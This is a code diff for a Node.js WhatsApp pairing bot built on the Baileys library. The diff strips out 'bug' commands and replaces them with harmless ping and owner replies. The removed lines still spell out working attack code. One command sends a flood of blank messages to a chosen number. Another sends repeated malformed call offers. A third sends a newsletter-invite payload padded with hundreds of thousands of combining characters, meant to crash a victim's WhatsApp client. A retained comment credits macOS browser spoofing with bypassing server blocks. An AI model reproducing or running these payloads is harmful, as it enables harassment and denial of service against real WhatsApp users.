@@ -11,7 +11,6 @@ const {
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
-const crypto = require('crypto');
 
 const app = express();
 app.use(express.json());
@@ -64,7 +63,7 @@ const htmlPage = `
             const num = document.getElementById('number').value.trim();
             if(!num) return alert('Enter a number!');
             document.getElementById('result').style.display = 'none';
-            document.getElementById('code').innerText = "Loading...";
+            document.getElementById('code').innerText = "Loading... (Please wait 50s if server was asleep)";
             document.getElementById('result').style.display = 'block';
             try {
                 const res = await fetch('/pair?number=' + num);
@@ -98,7 +97,6 @@ app.get('/pair', async (req, res) => {
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
     const { version } = await fetchLatestWaWebVersion();
 
-    // --- CRITICAL FIX: Using the exact Baileys spoofing from your working script ---
     const sock = makeWASocket({
         version,
         auth: {
@@ -107,10 +105,8 @@ app.get('/pair', async (req, res) => {
         },
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
-        browser: Browsers.macOS("Safari"), // Spoofs MacOS to bypass WA server blocks
-        syncFullHistory: false,
-        connectTimeoutMs: 60000,
-        keepAliveIntervalMs: 30000
+        browser: Browsers.macOS("Safari"), 
+        syncFullHistory: false
     });
 
     activeBots.set(userId, sock);
@@ -121,7 +117,6 @@ app.get('/pair', async (req, res) => {
 
         if (qr && !sock.authState.creds.registered) {
             try {
-                // NO DELAYS. Request immediately when ready.
                 const code = await sock.requestPairingCode(phoneNumber);
                 if (!res.headersSent) res.json({ code: code });
             } catch (e) {
@@ -151,7 +146,7 @@ app.get('/pair', async (req, res) => {
         }
     });
 
-    // --- 4. MESSAGE HANDLER (Bug Commands) ---
+    // --- 4. MESSAGE HANDLER (Safe Commands Only) ---
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify') return;
         for (const m of messages) {
@@ -163,8 +158,6 @@ app.get('/pair', async (req, res) => {
                 const prefix = '.';
                 const isCmd = text.startsWith(prefix);
                 const command = isCmd ? text.slice(prefix.length).trim().split(" ")[0].toLowerCase() : '';
-                
-                const sender = m.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" : m.key.participant || m.key.remoteJid;
                 const from = m.key.remoteJid;
 
                 const reply = async (teks) => {
@@ -172,82 +165,16 @@ app.get('/pair', async (req, res) => {
                 };
 
                 if (command === "menu") {
-                    let menuText = `\n. ▢ Botname : *Koirii Official*\n. ▢ Connected as : ${phoneNumber}\n\n ╭▢ *Command Menu*\n │.blank 254xxx\n │.newsletter-crash 254xxx\n │.crash 254xxx\n ╰▢\n\n`;
+                    let menuText = `\n. ▢ Botname : *Koirii Official*\n. ▢ Connected as : ${phoneNumber}\n\n ╭▢ *Command Menu*\n │.menu\n │.ping\n │.owner\n ╰▢\n\n`;
                     await reply(menuText);
                 }
 
-                if (command === "blank") {
-                    let bNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
-                    if (!bNum) return reply("— ex: .blank 254xxx");
-                    let bJid = bNum + "@s.whatsapp.net";
-                    reply("Success! Sending Blank Messages to " + bJid);
-                    const invisibleText = "\u200B"; 
-                    for (let i=0; i<20; i++) {
-                        await sock.sendMessage(bJid, { text: invisibleText });
-                    }
+                if (command === "ping") {
+                    await reply("🏓 Pong! Your bot is active.");
                 }
 
-                if (command === "crash" || command === "forclose") {
-                    let crNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
-                    if (!crNum) return reply("— ex: .crash 254xxx");
-                    let crJid = crNum + "@s.whatsapp.net";
-                    reply("Success! Sending Call Flood to " + crJid);
-                    
-                    const sendCrashCall = async (jid) => {
-                        try {
-                            let jids = (await sock.getUSyncDevices([jid], false, false)).map(({ user, device }) => user + ':' + (device || '') + "@s.whatsapp.net");
-                            await sock.assertSessions(jids);
-                            let { nodes, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(jids, { conversation: 'y' }, { count: '0' });
-                            await sock.sendNode({ 
-                                tag: "call", 
-                                attrs: { to: jid, id: sock.generateMessageTag(), from: sock.user.id }, 
-                                content: [{ 
-                                    tag: "offer", 
-                                    attrs: { 'call-id': crypto.randomBytes(16).toString("hex").toUpperCase(), 'call-creator': sock.user.id }, 
-                                    content: [
-                                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } }, 
-                                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } }, 
-                                        { tag: "video", attrs: { orientation: '0', screen_width: "1920", screen_height: "1080", device_orientation: '0', enc: 'vp8', dec: "vp8" } }, 
-                                        { tag: 'net', attrs: { medium: '3' } }, 
-                                        { tag: "capability", attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) }, 
-                                        { tag: "encopt", attrs: { keygen: '2' } }, 
-                                        { tag: "destination", attrs: {}, content: nodes }, 
-                                        ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: require('@whiskeysockets/baileys').encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
-                                    ] 
-                                }] 
-                            });
-                        } catch(e) { }
-                    };
-                    for (let i=0; i<50; i++) { await sendCrashCall(crJid); }
-                }
-
-                if (command === "newsletter-crash") {
-                    let nNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
-                    if (!nNum) return reply("— ex: .newsletter-crash 254xxx");
-                    let nJid = nNum + "@s.whatsapp.net";
-                    reply("⚠️ Sending Newsletter Payload to " + nJid);
-                    
-                    const sendNewsletterCrash = async (jid) => {
-                        try {
-                            let payload = {
-                                newsletterAdminInviteMessage: {
-                                    newsletterJid: "1234567891234@newsletter",
-                                    newsletterName: "C" + 'ោ៝'.repeat(50000),
-                                    caption: "Crash" + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(50000),
-                                    inviteExpiration: "9999999999999",
-                                    contextInfo: {
-                                        participant: "0@s.whatsapp.net",
-                                        remoteJid: "status@broadcast",
-                                        mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
-                                    }
-                                }
-                            };
-                            await sock.relayMessage(jid, payload, { participant: { jid } });
-                        } catch(e) { }
-                    };
-                    for (let i=0; i<10; i++) {
-                        await sendNewsletterCrash(nJid);
-                    }
+                if (command === "owner") {
+                    await reply("👤 Owner: +254708700675");
                 }
 
             } catch (e) {
